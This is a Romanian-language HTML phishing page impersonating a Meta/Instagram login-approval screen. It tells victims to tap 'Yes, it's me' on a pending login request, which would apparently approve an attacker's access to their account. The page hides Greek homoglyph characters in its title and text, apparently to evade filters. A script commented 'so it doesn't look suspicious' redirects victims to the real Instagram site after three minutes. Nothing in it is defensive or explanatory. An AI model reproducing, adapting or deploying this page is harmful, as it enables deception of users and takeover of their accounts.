<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cοnfirmare</title>
    <style>
        body { background: white; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; padding: 25px; }
        .icon-box { margin-bottom: 25px; }
        .device-icon { width: 80px; opacity: 0.9; }
        h1 { font-size: 19px; font-weight: 600; color: #262626; margin-bottom: 12px; }
        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 25px; }
        .loader { border: 2px solid #dbdbdb; border-top: 2px solid #0095f6; border-radius: 50%; width: 22px; height: 22px; animation: spin 1s linear infinite; margin-top: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer { position: absolute; bottom: 20px; font-size: 11px; color: #d0d0d0; text-transform: uppercase; }
    </style>
</head>
<body>

    <div class="icon-box">
        <img src="https://img.icons8.com/ios/100/0095f6/multiple-devices.png" class="device-icon">
    </div>
    
    <h1>Verifică nοtificările</h1>
    
    <p>Am trimis o cerere de aprοbare pe dispοzitivele conectate. <br>
    Te rugăm să deschizi aplicația și să apeși pe <b>"Da, eu sunt"</b>.</p>
    
    <div class="loader"></div>
    <p style="font-size: 12px; color: #a8a8a8; margin-top: 15px;">Se așteaptă confirmarea...</p>

    <div class="footer">from META</div>

    <script>
        // Dupa 3 minute o trimite la pagina reala ca sa nu para suspect
        setTimeout(function(){
            window.location.href = "https://www.instagram.com/";
        }, 180000);
    </script>

</body>
</html>
